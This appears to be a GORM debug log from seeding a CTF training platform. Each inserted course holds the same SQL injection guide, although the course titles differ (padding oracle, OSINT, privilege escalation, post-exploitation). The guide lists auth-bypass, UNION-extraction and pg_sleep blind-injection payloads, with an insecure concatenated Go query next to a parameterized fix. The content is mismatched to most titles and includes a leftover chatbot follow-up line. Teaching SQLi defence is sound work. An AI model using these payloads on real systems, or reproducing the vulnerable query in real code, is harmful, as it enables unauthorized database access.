2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[29.523ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.944','2025-06-09 14:07:53.944',NULL,'padding oracle attacks','Decrypting data via CBC padding errors',130,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.586ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.597ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 29 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[15.220ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.971','2025-06-09 14:07:53.971',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,29) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[10.564ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.98','2025-06-09 14:07:53.98',NULL,'quantum cryptography basics','Understanding post-quantum encryption',140,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.985ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.770ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 30 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[17.538ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54','2025-06-09 14:07:54',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,30) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.458ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.360ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.01','2025-06-09 14:07:54.01',NULL,'osint reconnaissance','Gathering target info from public sources',180,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.619ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.542ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 31 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.796ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.018','2025-06-09 14:07:54.018',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,31) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.717ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.028','2025-06-09 14:07:54.028',NULL,'privilege escalation','Gaining admin rights from low-level access',250,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.539ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 32 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[13.057ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.038','2025-06-09 14:07:54.038',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,32) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.828ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.048','2025-06-09 14:07:54.048',NULL,'post-exploitation techniques','Maintaining access after initial compromise',222,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.532ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.532ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 33 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[18.624ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.062','2025-06-09 14:07:54.062',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
